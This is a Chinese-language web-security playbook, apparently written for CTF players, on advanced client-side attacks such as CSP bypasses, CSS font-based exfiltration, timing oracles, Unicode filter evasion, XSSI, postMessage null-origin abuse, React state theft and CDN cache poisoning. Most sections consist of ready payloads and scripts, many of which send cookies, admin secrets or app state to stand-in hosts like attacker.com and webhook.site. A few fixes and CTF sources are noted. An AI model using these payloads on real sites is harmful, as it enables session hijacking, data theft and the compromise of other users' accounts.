---

phase: webapp
vuln_class: [xss, csp, client-side, xs-leak, cache-poisoning]
title: 高级客户端攻击
summary: CSP 严格时不是「没法打」，而是换成不用脚本的通道：CSS 外带、声明式框架、解析器差分、缓存键绕过。按「绕的是哪一层」分。
---

# 高级客户端攻击

基础注入、admin bot、缓存投毒见 [[web/漏洞分类/client-side.md|client-side.md]]。

## 0. 判据速查

| 观察到的现象 | 说明 | 去哪节 |
|---|---|---|
| CSP 白名单里有 `*.run.app` / `*.cloudfunctions.net` 等共享域名 | 你能在那些域名上部署脚本 | §1.1 |
| CSP 有 `script-src 'nonce-xxx'` 但**没有 `base-uri`** | `<base>` 改脚本源 | §1.2 |
| CSP 允许某个 CDN，且该 CDN 有声明式框架 | `_=` / `x-data` / `hx-get` 直接执行 | §1.3 |
| 同源端点能把 Content-Type 当参数传 | 声明成 `application/javascript` 就是脚本 | §1.4 |
| `script-src` 严格但没管 `link` / `meta` | `<link rel=prefetch>` 无脚本外带 | §1.5 |
| 能注入 CSS（`<style>` 或 `style` 属性） | `@font-face` + `unicode-range` 逐字符外带 | §2 |
| 页面有 `startsWith` + 昂贵 KDF | 时序 oracle 读前缀 | §3 |
| 签名逻辑在前端 JS 里 | 密钥必然泄露，直接伪造 | §4 |
| 多个子域共享二级域 | 从弱子域给父域种 cookie | §5 |
| 过滤器只删 ASCII 字符 | Unicode 折叠/全角/十进制 IP 绕 | §6 |
| 有 JSONP / `?callback=` | XSSI 跨源读数据 | §7 |
| postMessage 的 origin 校验没排除 `null` | `data:` iframe / sandbox iframe | §8 |
| 目标是 React 渲染 | `__reactFiber$` 直接读组件 state | §9 |
| 用户名字段能带 `.js` 后缀 | CDN 按扩展名缓存 → 投毒成共享资产 | §10 |

**核心判据**：所有「高级」客户端绕过都是**两套规则对同一份数据的理解差异** —— 净化器和执行器、CSP 和浏览器解析、CDN 缓存键和应用语义、代理和框架的 URL 解析。

---

## 1. CSP 绕过

### 1.1 白名单域名本身可被攻击者部署内容

CSP 白名单 `*.us-central1.run.app`、`*.cloudfunctions.net`、`*.azurewebsites.net` 时，任何人都能在这些共享域名上部署一个函数并加载它。

```python
def serveIt(request):
    js = """
    var xhr = new XMLHttpRequest();
    xhr.open('GET', location.origin + '/admin/secret', true);
    xhr.onload = function() {
        fetch('https://attacker.com/log?flag=' + encodeURIComponent(xhr.responseText));
    };
    xhr.send(null);
    """
    return (js, 200, {'Content-Type': 'application/javascript',
                      'Access-Control-Allow-Origin': '*'})
```

```bash
gcloud functions deploy serveIt --runtime python39 --trigger-http --allow-unauthenticated
```

```html
<script src="https://your-func-xxxxx.us-central1.run.app"></script>
```

**判据**：CSP 里出现任何**多租户共享域名**（云函数、对象存储、CDN 通用域）就等于开放。用 nonce/hash 替代域名白名单。

（题目例证：BSidesSF 2025）

### 1.2 缺 `base-uri` → `<base>` 劫持 nonce 脚本

```
Content-Security-Policy: script-src 'nonce-abc123'; default-src 'self'
```

没有 `base-uri` 时，注入一个 `<base>` 就能把所有**相对路径**的脚本重定向到自己的服务器 —— 而 nonce 依然匹配，CSP 照样放行：

```html
<base href="https://attacker.com/">
<!-- 页面后面原有的 -->
<script nonce="abc123" src="test.js"></script>
<!-- 实际加载 https://attacker.com/test.js -->
```

**关键**：`script-src 'nonce-xxx'` 只校验 nonce 值，**不限制脚本从哪加载**（要限制得用域名）。所以只要有一处 HTML 注入在 nonce 脚本之前，且该脚本用的是相对 URL，就完全绕过。

**检测**：CSP 有 `nonce` 但无 `base-uri`，且页面里有 `<script nonce=... src="相对路径.js">`。

**修法**：CSP 必带 `base-uri 'self'` 或 `base-uri 'none'`。

（题目例证：BSidesSF 2026 — web-tutorial-2）

### 1.3 声明式框架：净化器不认识的执行面

CSP 允许某个 CDN，而该 CDN 上有 Hyperscript / Alpine.js / htmx —— 这些库**从 HTML 属性里执行代码**，净化器不认识这些属性：

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
<div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
```

流程：HTML 过了净化（没有内联 script、没有 `on*` 事件）→ 库从 CDN 加载（CSP 允许）→ 库扫描 `_=` 属性并执行。

**同类属性**：
- Alpine.js：`x-data`、`x-init`、`x-on:`
- htmx：`hx-get`、`hx-trigger`、`hx-on:`
- Vue（若允许 `v-html` + 编译器）

**判据**：CSP 里有 CDN，且该 CDN 提供任何声明式/行为式框架 → 净化器的标签/属性黑名单必然漏。这是「**白名单比黑名单危险**」的典型。

（题目例证：UNbreakable 2026 — minegamble）

### 1.4 同源端点 + 可控 Content-Type

CSP 是 `script-src 'self'` 且带 `X-Content-Type-Options: nosniff`，正常注入被挡。但若同源有个端点把 Content-Type 当参数：

```
/xss?xss=<payload>&mimis=<mime>
```

把 `mimis` 设成 `application/javascript`（Chrome 宽松时用 `jscript`），这个同源响应就能被 `<script src>` 加载：

```html
<script src="/xss?xss=function%20WELCOME(){};var%20oooooo=0;/*&mimis=jscript"></script>
<script src="/xss?xss=*/payload;//&mimis=jscript"></script>
```

第一条注入无害 token 并打开块注释 `/*`，第二条闭合 `*/` 再执行真 payload。两个响应都来自 `self`，`script-src 'self'` 满足。

**关键**：`nosniff` 只能阻止浏览器**猜**类型，不能覆盖**服务器自己声明**的类型。

**判据**：任何「响应类型由用户控制」的端点（query 参数、`Accept` 头）在 `script-src 'self'` 下都是脚本 gadget。修法是硬编码 Content-Type，绝不把用户输入写进头。

（题目例证：Midnight Sun CTF Finals 2018 — Mimisbrunnr）

### 1.5 无脚本外带通道

`script-src` 不管导航和资源预取：

```html
<link rel="prefetch" href="http://attacker.com/steal?data=SECRET">
<meta http-equiv="refresh" content="0; url=http://attacker.com/steal">
```

**判据**：有 HTML 注入但 `script-src` 全封时，数据可以走 URL 参数或 `Referer` 头出去。`prefetch` / `preload` / `dns-prefetch` / `meta refresh` / `<img>` 都在 CSP 管辖之外（除非显式配了 `img-src`/`connect-src`）。

（题目例证：Boston Key Party 2016）

---

## 2. 纯 CSS 外带（`style-src` 允许时）

### 2.1 `@font-face` + `unicode-range`：读字符集

每个字符定义一条 `@font-face`，`unicode-range` 只覆盖那一个码点。渲染时**只有页面上真实存在的字符**才会触发对应字体请求：

```css
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=a'); unicode-range: U+0061; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=b'); unicode-range: U+0062; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=0'); unicode-range: U+0030; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7B'); unicode-range: U+007B; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7D'); unicode-range: U+007D; }
.target { font-family: exfil; }
```

```python
import string
charset = string.ascii_lowercase + string.digits + "_{}"
rules = []
for c in charset:
    enc = c if c.isalnum() else f"%{ord(c):02X}"
    rules.append(
        f"@font-face {{ font-family: exfil; "
        f"src: url('http://attacker.com/leak?c={enc}'); "
        f"unicode-range: U+{ord(c):04X}; }}"
    )
rules.append(".target { font-family: exfil; }")
payload = "\n".join(rules)
```

**必须**：跨源 CSS 要 `Content-Type: text/css`。注入方式：`<link rel=stylesheet href=...>` 或 `<style>@import url(...)</style>`。

**局限**：只泄露**字符集合**，没有顺序和数量。要拿顺序得配合位置技巧（`::first-letter` 单独字体、`text-indent` + `overflow:hidden` 隔离字符、`:nth-child`）。

（题目例证：Harekaze CTF 2018）

### 2.2 自定义字形宽度 + 容器查询：读位置

比 2.1 精确 —— 每个字符的字形宽度不同，用容器查询按宽度区间触发不同请求：

```css
@container (min-width: 150px) and (max-width: 160px) {
  .probe { background: url('https://attacker.com/?char=a&pos=0'); }
}
```

1. 目标选择器：`script:not([src]):has(+script[src*='purify'])` 指向内联脚本内容
2. 每个字符的字形 advance width = `(char_index + 1) * 1536` font unit
3. 外层元素 `container-type: inline-size`
4. 逐个位置探测，按测得宽度收敛到一个字符

**判据**：`style-src` 开放（哪怕是 `unsafe-inline`）且能注入 CSS 时，这套完全不需要 JS，严格 CSP 拦不住。

（题目例证：UNbreakable 2026 — larpin）

---

## 3. 时序 oracle

### 3.1 前缀校验 + 昂贵 KDF

服务端做 `secret.startsWith(candidate)`，匹配后还要跑 300 万次 PBKDF2 —— 命中慢、不命中快。跨源用弹窗导航测时间：

```javascript
async function probeChar(known, candidates) {
  const timings = {};
  for (const c of candidates) {
    const start = performance.now();
    popup.location = `${TARGET}/verify?prefix=${known}${c}`;
    await waitForResponse();          // postMessage 或 load 事件
    timings[c] = performance.now() - start;
  }
  return Object.entries(timings).sort((a, b) => b[1] - a[1])[0][0];
}
```

**判据**：任何「短路前缀比较 + 昂贵运算」的组合都是时序 oracle。`startsWith` 快速失败 vs 全量 KDF 的时间差，跨源可测。

（题目例证：UNbreakable 2026 — svfgp）

### 3.2 终端控制字符隐藏输出

服务端用退格符（0x08）藏数据 —— 终端渲染 `S\x08 ` 时后者覆盖前者，flag 在正常显示里看不见。读原始字节：

```python
import socket
s = socket.socket(); s.connect((host, port))
data = s.recv(4096)
flag = data.replace(b'\x08', b'').replace(b' ', b'')
```

**判据**：输出看起来「缺字符」或有诡异空白 → 抓原始字节。同类还有 `\r`（回车覆写）、ANSI 转义序列。

（题目例证：SECCON 2015）

---

## 4. 前端签名必然泄露密钥

应用在前端 JS 里构造带 HMAC 的请求 —— 密钥按定义必须在 JS 里。

```javascript
// 反混淆 main.js 后找到：
function buildUrl(page) {
    var sig = calcSHA1(page + "Ace in the Hole");   // 硬编码密钥
    return "/load?p=" + page + "&s=" + sig;
}

// 直接在控制台调用泄露的全局函数伪造任意签名
var forgedUrl = "/load?p=index.php&s=" + calcSHA1("index.php" + "Ace in the Hole");
```

**打法**：jsbeautifier 或 DevTools pretty-print 反混淆 → 找签名函数 → 取硬编码密钥 → 在控制台调用原函数伪造。

**判据**：控制台里搜 `calcSHA1`、`hmac`、`sign`、`signature`。只要签名逻辑在前端，密钥就不是秘密。

（题目例证：Codegate 2013）

---

## 5. 跨子域 cookie 注入

两个子域共享二级域（`user.example.vip` 和 `admin.example.vip`），`domain=.example.vip` 的 cookie 两边都收。

```javascript
// 在攻击者可控的子域上给父域种 cookie
document.cookie = 'username=<script src=//example.invalid/payload.js></script>; path=/; domain=.example.invalid;';
window.top.location = 'http://admin.example.invalid:8000';

// payload.js 里：沙箱覆盖了 XMLHttpRequest 时，从 iframe 里取回原生对象
var iframe = document.createElement('iframe');
iframe.src = 'about:blank';
document.body.appendChild(iframe);
window.XMLHttpRequest = iframe.contentWindow.XMLHttpRequest;
```

**判据**：任一子域反射 cookie 值且不净化 → 从别的子域种恶意 cookie 就能在目标子域 XSS。沙箱覆盖 `XMLHttpRequest` 时用 about:blank iframe 取回原生对象。

（题目例证：0CTF 2017 — complicated xss）

---

## 6. 字符过滤器绕过

### 6.1 Unicode 大小写折叠差分

净化层是 ASCII 正则（Flask `<\s*/?\s*script`），第二层是 Unicode 感知的折叠（Go `strings.EqualFold`），`ſ`（U+017F）会被折叠成 `s`：

```html
<ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
```

1. Flask 正则查 `<script` —— `<ſcript` 不匹配（`ſ` ≠ `s`）
2. Go 的 `EqualFold` 把 `ſ` 折叠成 `s`，`<ſcript>` 变成 `<script>`
3. 前端 `innerHTML` 插入，浏览器解析出合法的 script 标签

**其他折叠对**：

| 字符 | 折叠为 |
|---|---|
| `ſ` U+017F | `s` / `S` |
| `ı` U+0131 | `i` / `I` |
| `ﬁ` U+FB01 | `fi` |
| `K` U+212A（开尔文符号） | `k` / `K` |

**判据**：不同层用不同规范化标准（ASCII 正则 vs Unicode 折叠）就有绕过。查每层各自做了什么处理。

（题目例证：UNbreakable 2026 — demolition）

### 6.2 全角字符 / 十进制 IP

过滤器只删 ASCII 字符时：

- **全角字母**：`ｘ`（U+FF58）→ Chrome 归一化成 `x`。U+FF01–U+FF5E 与 ASCII 1:1 对应。
- **十进制 IP**：`92.123.45.67` → `92*256³ + 123*256² + 45*256 + 67 = 1558071511`，URL 里写成 `http://1558071511/`，一个点都没有。

```html
<script>
  window["location"] = "http://1558071511/"["concat"](document["cookie"])
</script>
```

方括号取值 + `["concat"]()` 拼串，全篇不含 `.`。

**常用归一化映射**：

```
U+FF41 (ａ) → a     ... U+FF5A (ｚ) → z
U+FF0F (／) → /
U+FF1A (：) → :
U+2100 (℀) → a/c
```

**自己找映射**：

```python
import unicodedata
for cp in range(0x100, 0xffff):
    if unicodedata.normalize('NFKC', chr(cp)) == 'a':
        print(f"U+{cp:04X}")
```

**判据**：客户端 URL 校验如果不做和浏览器一样的归一化，长度检查和字符黑名单都能绕。

（题目例证：33C3 CTF 2016 — yoso；RCTF 2017）

### 6.3 Referer 头反射

`Referer` 很少被当「用户输入」净化。反射进 `<meta refresh>` 就是 XSS：

```html
<meta http-equiv="refresh" content="0; url=REFERER_VALUE">
```

```
Referer: javascript:fetch('https://attacker.com/?c='+document.cookie)
```

```bash
# 先确认反射
curl -v -H "Referer: test_marker" http://target/page 2>&1 | grep "test_marker"
```

**配合 WebRTC 泄露内网 IP**（无需用户交互、无需权限）：

```javascript
var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
pc.createDataChannel("");
pc.createOffer().then(o => pc.setLocalDescription(o));
pc.onicecandidate = function(ice) {
  if (!ice?.candidate?.candidate) return;
  fetch('https://attacker.com/?ip=' + encodeURIComponent(ice.candidate.candidate));
};
```

拿到内网 IP 后可用于 SSRF 打 `localhost:80` 或内网服务。

（题目例证：Tokyo Westerns 2017）

---

## 7. XSSI：不用注入也能跨源读数据

返回 JavaScript 的端点（JSONP 回调、JS 变量赋值）会**跨源执行**，攻击者只要定义好同名函数就能收到数据。

```html
<script>
function leak(data) {
    new Image().src = "https://attacker.cloudfunctions.net/exfil?d=" +
        encodeURIComponent(JSON.stringify(data));
}
</script>
<script src="/characters.js?callback=leak"></script>
```

**典型多段链**：

1. **cookie 哈希反推**：cookie 是 `SHA1(小整数)`，直接爆破还原 ID

   ```python
   import hashlib
   for i in range(1, 100001):
       if hashlib.sha1(str(i).encode()).hexdigest() == cookie_hash:
           print(i); break
   ```

2. **调试端点 IDOR**：`/debug/game-state?user_id=<id>`（从 HTML 注释 + robots.txt 发现）
3. **XSSI 外带**：用消息功能注入 `<script src="/characters.js?callback=leak">`，数据进 `leak()`

**判据**：有 `?callback=` / `?jsonp=`，且响应是 `application/javascript`。修法：禁 JSONP、返回 `application/json`、加 `X-Content-Type-Options: nosniff`、用 CORS。

（题目例证：BSidesSF 2026 — three-questions-3）

---

## 8. postMessage 的 null origin

很多 handler 写 `event.origin !== expected` 就返回，但**没排除 `null`**。`data:` URI iframe 和 `sandbox`（无 `allow-same-origin`）都产生 `null` origin：

```html
<iframe src="data:text/html,<script>
var w = window.open('http://target/page');
setTimeout(function(){
    w.postMessage({type:'audio', details:{
        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
    }, '*');
}, 1000);
</script>"></iframe>
```

```html
<!-- sandbox 无 allow-same-origin 也是 null origin -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
    parent.postMessage({type:'audio', details:{
        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
    }, '*');
</script>
"></iframe>
```

**判据**：handler 里 `if (event.origin === 'http://trusted.com' || !event.origin)` 这种「空 origin 也放行」的写法。修法：显式拒绝 `null` 和空串。

（题目例证：BackdoorCTF 2018）

---

## 9. React 组件 state 提取

React 把组件状态挂在 DOM 节点上（为热重载和 devtools）。XSS 后可以直接读：

```javascript
const el = document.querySelector('[data-react-root]');
const key = Object.keys(el).find(k => k.startsWith('__reactInternalInstance$'));
const fiber = el[key];
const state = fiber.return.stateNode.state;
fetch('https://attacker.example/log?s=' + encodeURIComponent(JSON.stringify(state)));
```

React 17+ 属性名是 `__reactFiber$<random>`，路径是 `.stateNode.memoizedState`。沿 `.return` 往上走，直到 `stateNode !== null`。

**关键**：这些 state 是**客户端 fetch 来的、从没写进 HTML 的**数据 —— auth token、私聊、管理面板内容。所以 CSP 拦不住：读 state 的代码本身是 CSP 允许的 JS。

**判据**：目标是 React 且已拿到 XSS → 先试读 fiber，别费力去猜接口。

（题目例证：RCTF 2018）

---

## 10. CDN 按扩展名缓存导致的投毒

自 XSS 本身没用（只对自己生效），但 CDN **按 URL 扩展名**判定是否缓存静态资源，不看 `Content-Type` 也不看 `Vary: Cookie`。

注册一个以 `.js` 结尾的用户名 → `/profile/<user>.js` 被当静态 JS 缓存 → 自己访问一次把**认证态的 HTML** 写进边缘缓存 → 之后所有访客（包括 admin bot）拿到的都是这份带 XSS 的 HTML。

```python
import requests, random
s = requests.Session()
user = f'hfs-{random.randint(10**7, 10**8)}.js'      # 关键：.js 后缀
s.post('http://target/login', data=f'login={user}&password={user}',
       headers={'Content-Type': 'application/x-www-form-urlencoded'})

payload = ('fetch("/profile").then(e=>e.text()).then(f=>'
           'new Image().src="//attacker.tld/?"+/secret(.*)>/.exec(f)[0])')
raw = (
  '------B\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nazz\r\n'
  '------B\r\nContent-Disposition: form-data; name="shoesize"\r\n\r\n'
  f'1 tabindex=1 contenteditable autofocus onfocus={payload}\r\n'
  '------B--\r\n'
)
s.post(f'http://target/profile/{user}', data=raw,
       headers={'Content-Type': 'multipart/form-data; boundary=----B'})

s.get(f'http://target/profile/{user}')     # 认证态访问一次，投毒
```

**Cloudflare 是分区域的**，把 VM 放在和题目基础设施同区域，命中率才高。

**判据**：**给任意用户页 URL 加上 `.js`/`.css`/`.svg`/`.ico`/`.png` 后缀，用未认证请求去取 —— 如果返回的是认证态内容，就是投毒原语。** 这一步比读代码快得多。

（题目例证：CONFidence CTF 2019 Teaser — Web 50）

---

## 11. 纪律

- **CSP 先读策略再动手**。看三件事：有没有 `base-uri`、白名单里有没有多租户域名、`style-src` 开不开。这三条决定了走 §1 还是 §2。
- **白名单域名等于开放**。任何共享基础设施域名（云函数、对象存储、公共 CDN）出现在 CSP 里，就是可以部署内容的入口。
- **没有 JS 也能外带**。`style-src` 开放就走 CSS（§2），只有 HTML 注入就走 `link`/`meta`（§1.5）。别因为 `script-src 'none'` 就放弃。
- **扩展名比 Content-Type 更能骗过 CDN**。加后缀这一步成本最低，先试。
- **前端签名必然泄露密钥**。看到前端算 HMAC，不要想着破，直接找密钥。
- **时序 oracle 要多次测量取中位数**。单次测量噪声大，尤其跨源。
- **报的是数据泄露不是「CSP 配置不当」**。成果落到「读到了 admin 的 state / 字符集 / 内部 IP」。
